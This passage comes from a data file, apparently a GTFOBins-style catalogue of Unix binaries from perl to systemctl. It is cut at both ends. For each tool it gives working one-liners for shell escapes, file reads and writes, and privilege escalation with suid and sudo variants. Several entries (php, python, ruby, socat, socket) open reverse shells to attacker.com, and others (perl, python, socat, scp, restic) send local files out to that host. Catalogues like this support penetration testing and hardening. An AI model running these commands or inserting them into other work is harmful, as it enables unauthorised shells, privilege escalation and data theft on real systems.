    "shell": [{"code": "perl -e 'exec \"/bin/sh\"'"}, {"code": "PERL5OPT=-d PERL5DB='exec \"/bin/sh\"' perl /dev/null", "comment": "The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell."}],
    "upload": [{"code": "perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>\"attacker.com\", PeerPort=>80, Proto=>\"tcp\") or die;open(my $file, \"<\", \"/path/to/input-file\") or die;$content = join(\"\", <$file>);close($file);$headers = \"POST / HTTP/1.1\\r\\nHost: attacker.com\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: \" . length($content) . \"\\r\\nConnection: close\\r\\n\\r\\n\";print $s $headers . $content;while (<$s>) { }close($s);'"}]
  },
  "perlbug": {
    name: "perlbug",
    functions: ["shell"],
    "shell": [{"code": "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'", "comment": "This requires to press `Enter` serveral times before the shell is spawn."}]
  },
  "pexec": {
    name: "pexec",
    functions: ["shell"],
    "shell": [{"code": "pexec /bin/sh", "suid_code": "pexec /bin/sh -p"}]
  },
  "pg": {
    name: "pg",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "pg /path/to/input-file"}],
    "shell": [{"code": "pg /etc/hosts\n!/bin/sh"}]
  },
  "php": {
    name: "php",
    functions: ["command", "download", "file-read", "file-write", "reverse-shell", "shell", "upload"],
    "command": [{"code": "php -r 'echo shell_exec(\"/path/to/command\");'"}, {"code": "php -r '$r=array(); exec(\"/path/to/command\", $r); print(join(\"\\n\",$r));'"}, {"code": "php -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"/path/to/command\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"}],
    "download": [{"code": "php -r '$c=file_get_contents(\"http://attacker.com/path/to/input-file\"); file_put_contents(\"/path/to/output-file\", $c);'"}],
    "file-read": [{"code": "php -r 'readfile(\"/path/to/input-file\");'"}],
    "file-write": [{"code": "php -r 'file_put_contents(\"/path/to/output-file\", \"DATA\");'"}],
    "reverse-shell": [{"code": "php -r '$sock=fsockopen(\"attacker.com\",12345);exec(\"/bin/sh -i 0<&3 1>&3 2>&3\");'"}],
    "shell": [{"code": "php -r 'system(\"/bin/sh -i\");'"}, {"code": "php -r 'passthru(\"/bin/sh -i\");'"}, {"code": "php -r '$h=@popen(\"/bin/sh -i\",\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'"}, {"code": "php -r 'pcntl_exec(\"/bin/sh\");'", "suid_code": "php -r 'pcntl_exec(\"/bin/sh\", [\"-p\"]);'"}],
    "upload": [{"code": "php -S 0.0.0.0:80"}]
  },
  "pic": {
    name: "pic",
    functions: ["file-read", "shell"],
    "file-read": [{"code": "pic /path/to/input-file", "comment": "The output is prefixed with some content."}],
    "shell": [{"code": "pic -U\n.PS\nsh X sh X"}]
  },
  "pidstat": {
    name: "pidstat",
    functions: ["shell"],
    "shell": [{"code": "pidstat -e /bin/sh", "suid_code": "pidstat -e /bin/sh -p"}]
  },
  "pip": {
    name: "pip",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "echo '...' >setup.py\npip install --break-system-packages .", "comment": "This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).\n\nKeep in mind that the TTY is lost, so `/dev/tty` can be used, for example:\n\n```\necho 'import os; os.system(\"exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty\")' >setup.py\n```\n\nThe `--break-system-packages` flag can be omitted in older systems."}],
    "shell": [{"code": "pip config --editor '/bin/sh -s' edit"}]
  },
  "pipx": {
    name: "pipx",
    functions: ["inherit"],
    "inherit": [{"code": "echo '...' >/path/to/file.py\npipx run /path/to/file.py", "comment": "This allows to run Python code (`...`)."}]
  },
  "pkexec": {
    name: "pkexec",
    functions: ["shell"],
    "shell": [{"code": "pkexec /bin/sh"}]
  },
  "pkg": {
    name: "pkg",
    functions: ["command"],
    "command": [{"code": "pkg install -y --no-repo-update ./x-1.0.txz", "comment": "Generate the FreeBSD package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\necho /path/to/command >x.sh\nfpm -n x -s dir -t freebsd -a all --before-install x.sh .\n```"}]
  },
  "plymouth": {
    name: "plymouth",
    functions: ["shell"],
    "shell": [{"code": "plymouth ask-for-password --prompt=x --command=/bin/sh", "suid_code": "plymouth ask-for-password --prompt=x --command='/bin/sh -p'"}]
  },
  "podman": {
    name: "podman",
    functions: ["shell"],
    "shell": [{"code": "podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh", "comment": "This requires an actual image to be available (e.g., `alpine`) downloading it if not present."}]
  },
  "poetry": {
    name: "poetry",
    functions: ["inherit"],
    "inherit": [{"code": "echo '...' >/path/to/temp-file\npoetry run python /path/to/temp-file", "comment": "This allows to run Python code (`...`).\n\nA valid `pyproject.toml` file must be present in the current working directory, you can create one with `poetry init -n`."}]
  },
  "posh": {
    name: "posh",
    functions: ["shell"],
    "shell": [{"code": "posh"}]
  },
  "pr": {
    name: "pr",
    functions: ["file-read"],
    "file-read": [{"code": "pr -T /path/to/input-file"}]
  },
  "procmail": {
    name: "procmail",
    functions: ["command"],
    "command": [{"code": "echo -e ':0\\n| /path/to/command >/path/to/temp-file\nprocmail -m /path/to/temp-file", "comment": "The program is picky about the file ownership, and waits for some input."}]
  },
  "pry": {
    name: "pry",
    functions: ["inherit"],
    "inherit": [{"code": "pry"}]
  },
  "psftp": {
    name: "psftp",
    functions: ["shell"],
    "shell": [{"code": "psftp\n!/bin/sh"}]
  },
  "psql": {
    name: "psql",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "psql\n\\?"}],
    "shell": [{"code": "psql\n\\! /bin/sh"}]
  },
  "ptx": {
    name: "ptx",
    functions: ["file-read"],
    "file-read": [{"code": "ptx -w 999 /path/to/input-file"}]
  },
  "puppet": {
    name: "puppet",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "puppet filebucket -l diff /dev/null /path/to/input-file", "comment": "The read file content is corrupted by the `diff` output format. The actual `diff` command is executed."}],
    "file-write": [{"code": "puppet apply -e 'file { \"/path/to/output-file\": content => \"DATA\" }'"}],
    "shell": [{"code": "puppet apply -e \"exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }\""}]
  },
  "pwsh": {
    name: "pwsh",
    functions: ["file-write", "shell"],
    "file-write": [{"code": "pwsh -c '\"DATA\" | Out-File /path/to/output-file'"}],
    "shell": [{"code": "pwsh"}]
  },
  "pygmentize": {
    name: "pygmentize",
    functions: ["file-read"],
    "file-read": [{"code": "pygmentize -l text /path/to/input-file"}]
  },
  "pyright": {
    name: "pyright",
    functions: ["file-read"],
    "file-read": [{"code": "pyright /path/to/input-file", "comment": "Content is leaked as error messages."}, {"code": "pyright --outputjson /path/to/input-file", "comment": "Content is leaked as error messages in JSON format."}, {"code": "pyright -w /path/to/input-dir/", "comment": "Recursively walks directories, parsing all Python files and leaking some contents through diagnostics."}]
  },
  "python": {
    name: "python",
    functions: ["download", "file-read", "file-write", "library-load", "reverse-shell", "shell", "upload"],
    "download": [{"code": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://attacker.com/path/to/input-file\", \"/path/to/output-file\")'"}],
    "file-read": [{"code": "python -c 'print(open(\"/path/to/input-file\").read())'"}],
    "file-write": [{"code": "python -c 'open(\"/path/to/output-file\",\"w+\").write(\"DATA\")'"}],
    "library-load": [{"code": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"/path/to/lib.so\")'"}],
    "reverse-shell": [{"code": "python -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"attacker.com\",12345))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"}],
    "shell": [{"code": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'", "suid_code": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"}],
    "upload": [{"code": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(\"http://attacker.com\", open(\"/path/to/input-file\", \"rb\").read())'"}, {"code": "python -c 'import sys\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", 12345), s.SimpleHTTPRequestHandler).serve_forever()'"}]
  },
  "qpdf": {
    name: "qpdf",
    functions: ["file-read"],
    "file-read": [{"code": "qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file\nqpdf --show-attachment=x /path/to/output-file"}]
  },
  "rake": {
    name: "rake",
    functions: ["file-read", "inherit"],
    "file-read": [{"code": "rake -f /path/to/input-file", "comment": "The file is actually parsed and the first wrong line is returned in an error message."}],
    "inherit": [{"code": "rake -p '...'", "comment": "This allows to run Ruby code (`...`)."}]
  },
  "ranger": {
    name: "ranger",
    functions: ["shell"],
    "shell": [{"code": "ranger\nS"}]
  },
  "rc": {
    name: "rc",
    functions: ["shell"],
    "shell": [{"code": "rc"}]
  },
  "readelf": {
    name: "readelf",
    functions: ["file-read"],
    "file-read": [{"code": "readelf -a @/path/to/input-file", "comment": "Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results."}]
  },
  "redcarpet": {
    name: "redcarpet",
    functions: ["file-read"],
    "file-read": [{"code": "redcarpet /path/to/input-file", "comment": "The file is actually parsed as a Markdown file."}]
  },
  "redis": {
    name: "redis",
    functions: ["file-write"],
    "file-write": [{"code": "redis-cli -h 127.0.0.1\nconfig set dir /path/to/output-dir/\nconfig set dbfilename output-file\nset x \"DATA\"\nsave", "comment": "Write files on the server running Redis at the specified location. Written data will appear amongst the database dump.\n\nKeep in mind that it's actually the server to perform the file write."}]
  },
  "restic": {
    name: "restic",
    functions: ["command", "shell", "upload"],
    "command": [{"code": "RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup"}, {"code": "restic --password-command='/path/to/command' backup"}],
    "shell": [{"code": "RESTIC_PASSWORD_COMMAND='/bin/sh -c \"/bin/sh 0<&2 1<&2\"' restic backup", "suid_code": "RESTIC_PASSWORD_COMMAND='/bin/sh -p -c \"/bin/sh -p 0<&2 1<&2\"' restic backup"}, {"code": "restic --password-command='/bin/sh -c \"/bin/sh 0<&2 1<&2\"' backup", "suid_code": "restic --password-command='/bin/sh -p -c \"/bin/sh -p 0<&2 1<&2\"' backup"}],
    "upload": [{"code": "restic backup -r rest:http://attacker.com:12345/x /path/to/input-file"}]
  },
  "rev": {
    name: "rev",
    functions: ["file-read"],
    "file-read": [{"code": "rev /path/to/input-file | rev"}]
  },
  "rlogin": {
    name: "rlogin",
    functions: ["upload"],
    "upload": [{"code": "rlogin -l DATA -p 12345 attacker.com", "comment": "The file is corrupted by leading and trailing spurious data."}]
  },
  "rlwrap": {
    name: "rlwrap",
    functions: ["file-write", "shell"],
    "file-write": [{"code": "rlwrap -l /path/to/output-file echo DATA", "comment": "This adds timestamps to the output file. This relies on the external `echo` command."}],
    "shell": [{"code": "rlwrap /bin/sh", "suid_code": "rlwrap /bin/sh -p"}]
  },
  "rpm": {
    name: "rpm",
    functions: ["command", "inherit", "shell"],
    "command": [{"code": "rpm -ivh x-1.0-1.noarch.rpm", "comment": "Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\necho /path/to/command >x.sh\nfpm -n x -s dir -t rpm -a all --before-install x.sh .\n```"}],
    "inherit": [{"code": "rpm --eval '%{lua:...}'", "comment": "This allows to run Lua code (`...`)."}],
    "shell": [{"code": "rpm --eval '%(/bin/sh 1>&2)'"}, {"code": "rpm --pipe '/bin/sh 0<&1'"}]
  },
  "rpmdb": {
    name: "rpmdb",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "rpmdb --eval '%{lua:...}'", "comment": "This allows to run Lua code (`...`)."}],
    "shell": [{"code": "rpmdb --eval '%(/bin/sh 1>&2)'"}]
  },
  "rpmquery": {
    name: "rpmquery",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "rpmquery --eval '%{lua:...}'", "comment": "This allows to run Lua code (`...`)."}],
    "shell": [{"code": "rpmquery --eval '%(/bin/sh 1>&2)'"}]
  },
  "rpmverify": {
    name: "rpmverify",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "rpmverify --eval '%{lua:...}'", "comment": "This allows to run Lua code (`...`)."}],
    "shell": [{"code": "rpmverify --eval '%(/bin/sh 1>&2)'"}]
  },
  "rsync": {
    name: "rsync",
    functions: ["shell"],
    "shell": [{"code": "rsync -e '/bin/sh -c \"/bin/sh 0<&2 1>&2\"' x:x", "suid_code": "rsync -e '/bin/sh -p -c \"/bin/sh -p 0<&2 1>&2\"' x:x"}]
  },
  "rsyslogd": {
    name: "rsyslogd",
    functions: ["command"],
    "command": [{"code": "cat >/path/to/temp-file <<EOF\nmodule(load=\"imuxsock\")\n:msg, contains, \"somerandomstring\" ^/path/to/command\nEOF\n\nrsyslogd -f /path/to/temp-file", "comment": "In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`. One possibility is to attempt to connect to the victim host via SSH, for example:\n\n```\nssh somerandomstring@victim.com\n```"}]
  },
  "rtorrent": {
    name: "rtorrent",
    functions: ["shell"],
    "shell": [{"code": "echo 'execute = /bin/sh,-c,\"/bin/sh </dev/tty >/dev/tty 2>/dev/tty\"' >~/.rtorrent.rc\nrtorrent", "comment": "After the shell, exit with `Ctrl-Q`.", "suid_code": "echo 'execute = /bin/sh,-p,-c,\"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty\"' >~/.rtorrent.rc\nrtorrent"}]
  },
  "ruby": {
    name: "ruby",
    functions: ["download", "file-read", "file-write", "library-load", "reverse-shell", "shell", "upload"],
    "download": [{"code": "ruby -e 'require \"open-uri\"; download = URI.open(\"http://attacker.com/path/to/input-file\"); IO.copy_stream(download, \"/path/to/output-file\")'"}],
    "file-read": [{"code": "ruby -e 'puts File.read(\"/path/to/input-file\")'"}],
    "file-write": [{"code": "ruby -e 'File.open(\"/path/to/output-file\", \"w+\") { |f| f.write(\"DATA\") }'"}],
    "library-load": [{"code": "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"/path/to/lib.so\")'"}],
    "reverse-shell": [{"code": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker.com\",12345);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"}],
    "shell": [{"code": "ruby -e 'exec \"/bin/sh\"'"}],
    "upload": [{"code": "ruby -run -e httpd . -p 80"}]
  },
  "run-mailcap": {
    name: "run-mailcap",
    functions: ["inherit"],
    "inherit": [{"code": "run-mailcap --action=view text/plain:/etc/hosts"}, {"code": "run-mailcap --action=edit text/plain:/path/to/output-file", "comment": "The file must exist and be not empty."}]
  },
  "run-parts": {
    name: "run-parts",
    functions: ["shell"],
    "shell": [{"code": "run-parts --new-session --regex '^sh$' /bin", "suid_code": "run-parts --new-session --regex '^sh$' /bin --arg='-p'"}, {"code": "cp /bin/sh /path/to/temp-dir/\nrun-parts /path/to/temp-dir/", "suid_code": "cp /bin/sh /path/to/temp-dir/\nrun-parts /path/to/temp-dir/ --arg='-p'"}]
  },
  "runscript": {
    name: "runscript",
    functions: ["shell"],
    "shell": [{"code": "echo '! exec /bin/sh' >/path/to/temp-file\nrunscript /path/to/temp-file"}]
  },
  "rustc": {
    name: "rustc",
    functions: ["file-read", "file-write", "inherit"],
    "file-read": [{"code": "rustc /path/to/input-file", "comment": "The compiler leaks some file lines in the compiler error."}],
    "file-write": [{"code": "echo 'fn main() { println!(\"DATA\"); }' >/path/to/temp-file\nrustc /path/to/temp-file -o /path/to/output-file", "comment": "The comment appears in the compiled program."}],
    "inherit": [{"code": "rustc --explain E0001"}]
  },
  "rustdoc": {
    name: "rustdoc",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "rustdoc /path/to/input-file", "comment": "Partial content is displayed as error messages."}],
    "file-write": [{"code": "echo '//! DATA' >/path/to/temp-file\nrustdoc /path/to/temp-file -o /path/to/output-dir/", "comment": "This command creates a number of documentation files in the target directory, and the data is written in multiple locations, e.g., `src/temp_file/temp-file.html`, amidst other content."}]
  },
  "rustfmt": {
    name: "rustfmt",
    functions: ["file-read"],
    "file-read": [{"code": "rustfmt /path/to/input-file", "comment": "Partial content is displayed as error messages."}]
  },
  "rustup": {
    name: "rustup",
    functions: ["command", "shell"],
    "command": [{"code": "mkdir /path/to/temp-dir/bin/\nmkdir /path/to/temp-dir/lib/\necho '/path/to/command' >/path/to/temp-dir/bin/rustc\nchmod +x /path/to/temp-dir/bin/rustc\nrustup toolchain link x /path/to/temp-dir/\nrustup run x rustc"}],
    "shell": [{"code": "mkdir /path/to/temp-dir/bin/\nmkdir /path/to/temp-dir/lib/\ncp /bin/sh /path/to/temp-dir/bin/rustc\nrustup toolchain link x /path/to/temp-dir/\nrustup run x rustc"}]
  },
  "sash": {
    name: "sash",
    functions: ["shell"],
    "shell": [{"code": "sash"}]
  },
  "scanmem": {
    name: "scanmem",
    functions: ["shell"],
    "shell": [{"code": "scanmem\nshell /bin/sh"}]
  },
  "scp": {
    name: "scp",
    functions: ["download", "shell", "upload"],
    "download": [{"code": "scp user@attacker.com:/path/to/input-file /path/to/output-file"}],
    "shell": [{"code": "echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file\nchmod +x /path/to/temp-file\nscp -S /path/to/temp-file x x:"}, {"code": "scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:"}],
    "upload": [{"code": "scp /path/to/input-file user@attacker.com:/path/to/output-file"}]
  },
  "screen": {
    name: "screen",
    functions: ["file-write", "shell"],
    "file-write": [{"code": "screen -L -Logfile /path/to/output-file echo DATA", "comment": "Data is appended to the file and `\\n` is converted to `\\r\\n`."}, {"code": "screen -L /path/to/output-file echo DATA", "comment": "Data is appended to the file and `\\n` is converted to `\\r\\n`."}],
    "shell": [{"code": "screen"}]
  },
  "script": {
    name: "script",
    functions: ["file-write", "shell"],
    "file-write": [{"code": "script -q -c '# DATA' /path/to/output-file", "comment": "The content appears among the log prints."}],
    "shell": [{"code": "script -q /dev/null"}]
  },
  "scrot": {
    name: "scrot",
    functions: ["shell"],
    "shell": [{"code": "scrot -e /bin/sh"}]
  },
  "sed": {
    name: "sed",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "sed '' /path/to/input-file"}],
    "file-write": [{"code": "sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts"}],
    "shell": [{"code": "sed -n '1e exec /bin/sh 1>&0' /etc/hosts"}, {"code": "sed e"}]
  },
  "service": {
    name: "service",
    functions: ["shell"],
    "shell": [{"code": "service ../../bin/sh"}]
  },
  "setarch": {
    name: "setarch",
    functions: ["shell"],
    "shell": [{"code": "setarch -3 /bin/sh", "suid_code": "setarch -3 /bin/sh -p"}]
  },
  "setcap": {
    name: "setcap",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "setcap cap_setuid+ep /path/to/command", "comment": "This can be used to assign capabilities to executable files."}]
  },
  "setfacl": {
    name: "setfacl",
    functions: ["privilege-escalation"],
    "privilege-escalation": [{"code": "setfacl -m u:$(id -un):rwx /path/to/input-file", "comment": "This can be run with elevated privileges to change ownership and then read, write, or execute a file."}]
  },
  "setlock": {
    name: "setlock",
    functions: ["shell"],
    "shell": [{"code": "setlock - /bin/sh", "suid_code": "setlock - /bin/sh -p"}]
  },
  "sftp": {
    name: "sftp",
    functions: ["download", "shell", "upload"],
    "download": [{"code": "sftp user@attacker.com\nget /path/to/input-file /path/to/output-file"}],
    "shell": [{"code": "sftp user@attacker.com\n!/bin/sh", "comment": "This still requires a successfull connection to the server."}],
    "upload": [{"code": "sftp user@attacker.com\nput /path/to/input-file /path/to/output-file"}]
  },
  "sg": {
    name: "sg",
    functions: ["shell"],
    "shell": [{"code": "sg $(id -ng)", "comment": "Commands can be run if the current user's group is specified, therefore no additional permissions are needed.", "sudo_code": "sg root"}]
  },
  "shred": {
    name: "shred",
    functions: ["file-write"],
    "file-write": [{"code": "shred -u /path/to/output-file", "comment": "This actually deletes the chosen file."}]
  },
  "shuf": {
    name: "shuf",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "shuf -z /path/to/input-file", "comment": "The read file content is corrupted by randomizing the order of NUL terminated strings."}],
    "file-write": [{"code": "shuf -e DATA -o /path/to/output-file", "comment": "The written file content is corrupted by adding a newline."}]
  },
  "slsh": {
    name: "slsh",
    functions: ["shell"],
    "shell": [{"code": "slsh -e 'system(\"/bin/sh\")'"}]
  },
  "smbclient": {
    name: "smbclient",
    functions: ["download", "shell", "upload"],
    "download": [{"code": "smbclient '\\\\attacker.com\\share' -c 'get /path/to/input-file /path/to/output-file'"}],
    "shell": [{"code": "smbclient '\\\\host\\share'\n!/bin/sh", "comment": "A valid SMB/CIFS server must be available."}],
    "upload": [{"code": "smbclient '\\\\attacker.com\\share' -c 'put /path/to/input-file /path/to/output-file'"}]
  },
  "snap": {
    name: "snap",
    functions: ["command"],
    "command": [{"code": "snap install xxxx_1.0_all.snap --dangerous --devmode", "comment": "Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\nmkdir -p meta/hooks\necho -e '#!/bin/sh\\n/path/to/command; false' >meta/hooks/install\nchmod +x meta/hooks/install\nfpm -n xxxx -s dir -t snap -a all meta\n```"}]
  },
  "socat": {
    name: "socat",
    functions: ["bind-shell", "download", "file-read", "file-write", "reverse-shell", "shell", "upload"],
    "bind-shell": [{"code": "socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane", "suid_code": "socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'"}],
    "download": [{"code": "socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat"}],
    "file-read": [{"code": "socat -u file:/path/to/input-file -"}],
    "file-write": [{"code": "socat -u 'exec:echo DATA' open:/path/to/output-file,creat", "comment": "The `echo` command is actually used."}],
    "reverse-shell": [{"code": "socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane", "suid_code": "socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'"}],
    "shell": [{"code": "socat - exec:/bin/sh,pty,ctty,raw,echo=0", "suid_code": "socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'"}],
    "upload": [{"code": "socat -u file:/path/to/input-file tcp-connect:attacker.com:12345"}]
  },
  "socket": {
    name: "socket",
    functions: ["bind-shell", "reverse-shell"],
    "bind-shell": [{"code": "socket -svp '/bin/sh -i' 12345"}],
    "reverse-shell": [{"code": "socket -qvp '/bin/sh -i' attacker.com 12345"}]
  },
  "soelim": {
    name: "soelim",
    functions: ["file-read"],
    "file-read": [{"code": "soelim /path/to/input-file", "comment": "The content is actually parsed and corrupted by the command."}]
  },
  "softlimit": {
    name: "softlimit",
    functions: ["shell"],
    "shell": [{"code": "softlimit /bin/sh", "suid_code": "softlimit /bin/sh -p"}]
  },
  "sort": {
    name: "sort",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "sort -m /path/to/input-file"}],
    "file-write": [{"code": "echo DATA | sort -m -o /path/to/output-file"}]
  },
  "split": {
    name: "split",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "split -b 999 --additional-suffix suffix /path/to/input-file prefix\ncat prefixaasuffix", "comment": "This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`."}],
    "file-write": [{"code": "split -b 999 --additional-suffix suffix /path/to/input-file prefix", "comment": "This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`."}],
    "shell": [{"code": "split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts"}]
  },
  "sqlite3": {
    name: "sqlite3",
    functions: ["file-read", "file-write", "shell"],
    "file-read": [{"code": "sqlite3 <<EOF\nCREATE TABLE x(x TEXT);\n.import /path/to/input-file x\nSELECT * FROM x;\nEOF"}],
    "file-write": [{"code": "sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select \"DATA\";'"}],
    "shell": [{"code": "sqlite3 /dev/null '.shell /bin/sh'"}]
  },
  "sqlmap": {
    name: "sqlmap",
    functions: ["inherit"],
    "inherit": [{"code": "sqlmap -u 127.0.0.1 --eval='...'", "comment": "This allows to run Python code (`...`)."}]
  },
  "ss": {
    name: "ss",
    functions: ["file-read"],
    "file-read": [{"code": "ss -a -F /path/to/input-file", "comment": "The file content is actually parsed so only a part of the first line is returned as a part of an error message."}]
  },
  "ssh": {
    name: "ssh",
    functions: ["download", "file-read", "shell", "upload"],
    "download": [{"code": "ssh user@attacker.com 'cat /path/to/input-file\""}],
    "file-read": [{"code": "ssh -F /path/to/input-file x", "comment": "The read file content is corrupted by error prints."}],
    "shell": [{"code": "ssh localhost /bin/sh", "comment": "Reconnecting may help bypassing restricted shells."}, {"code": "ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x"}, {"code": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost", "comment": "Spawn the shell on the client, but still requires a successful remote connection."}],
    "upload": [{"code": "echo DATA | ssh user@attacker.com 'cat >/path/to/output-file\""}]
  },
  "ssh-agent": {
    name: "ssh-agent",
    functions: ["shell"],
    "shell": [{"code": "ssh-agent /bin/sh", "suid_code": "ssh-agent /bin/sh -p"}]
  },
  "ssh-copy-id": {
    name: "ssh-copy-id",
    functions: ["file-read", "file-write"],
    "file-read": [{"code": "ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com", "comment": "The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used."}],
    "file-write": [{"code": "ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host", "comment": "The input file must have the `.pub` file extension."}]
  },
  "ssh-keygen": {
    name: "ssh-keygen",
    functions: ["library-load"],
    "library-load": [{"code": "ssh-keygen -D /path/to/lib.so", "comment": "The shared library must contain the `void C_GetFunctionList() {}` function."}]
  },
  "ssh-keyscan": {
    name: "ssh-keyscan",
    functions: ["file-read"],
    "file-read": [{"code": "ssh-keyscan -f /path/to/input-file", "comment": "The file content is actually parsed so only a part of each line is returned as a part of an error message."}]
  },
  "sshfs": {
    name: "sshfs",
    functions: ["command", "download", "shell", "upload"],
    "command": [{"code": "sshfs -o ssh_command=/path/to/command x: /path/to/dir/"}],
    "download": [{"code": "sshfs user@attacker.com:/ /path/to/dir/\ncp /path/to/dir/path/to/input-file /path/to/output-file"}],
    "shell": [{"code": "echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file\nchmod +x /path/to/temp-file\nsshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/", "comment": "The mount dir must be writable by the invoking user."}],
    "upload": [{"code": "sshfs user@attacker.com:/ /path/to/dir/\ncp /path/to/input-file /path/to/dir/"}]
  },
  "sshpass": {
    name: "sshpass",
    functions: ["shell"],
    "shell": [{"code": "sshpass /bin/sh", "suid_code": "sshpass /bin/sh -p"}]
  },
  "sshuttle": {
    name: "sshuttle",
    functions: ["shell"],
    "shell": [{"code": "sudo sshuttle -r x --ssh-cmd '/bin/sh -c \"/bin/sh 0<&2 1>&2\"' localhost"}]
  },
  "start-stop-daemon": {
    name: "start-stop-daemon",
    functions: ["shell"],
    "shell": [{"code": "start-stop-daemon -S -x /bin/sh", "suid_code": "start-stop-daemon -S -x /bin/sh -- -p"}]
  },
  "stdbuf": {
    name: "stdbuf",
    functions: ["shell"],
    "shell": [{"code": "stdbuf -i0 /bin/sh", "suid_code": "stdbuf -i0 /bin/sh -p"}]
  },
  "strace": {
    name: "strace",
    functions: ["file-write", "shell"],
    "file-write": [{"code": "strace -s 999 -o /path/to/output-file strace - DATA", "comment": "The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`."}],
    "shell": [{"code": "strace -o /dev/null /bin/sh", "suid_code": "strace -o /dev/null /bin/sh -p"}]
  },
  "strings": {
    name: "strings",
    functions: ["file-read"],
    "file-read": [{"code": "strings /path/to/input-file", "comment": "This only returns ASCII strings."}]
  },
  "su": {
    name: "su",
    functions: ["shell"],
    "shell": [{"code": "su -c /bin/sh"}]
  },
  "sudo": {
    name: "sudo",
    functions: ["shell"],
    "shell": [{"code": "sudo /bin/sh", "sudo_comment": "The invocation is actually `sudo sudo ...`."}]
  },
  "sysctl": {
    name: "sysctl",
    functions: ["command", "file-read"],
    "command": [{"code": "sysctl 'kernel.core_pattern=|/path/to/command'", "comment": "The command is executed by `root` in the background when a core dump occurs.\n\nTo trigger a core dump, send the `SIGQUIT` signal to a process, for example:\n\n```\nsleep infinity &\nkill -QUIT $!\n```"}],
    "file-read": [{"code": "sysctl -n \"/../../path/to/input-file\""}]
  },
  "systemctl": {
    name: "systemctl",
    functions: ["inherit", "shell"],
    "inherit": [{"code": "systemctl"}],
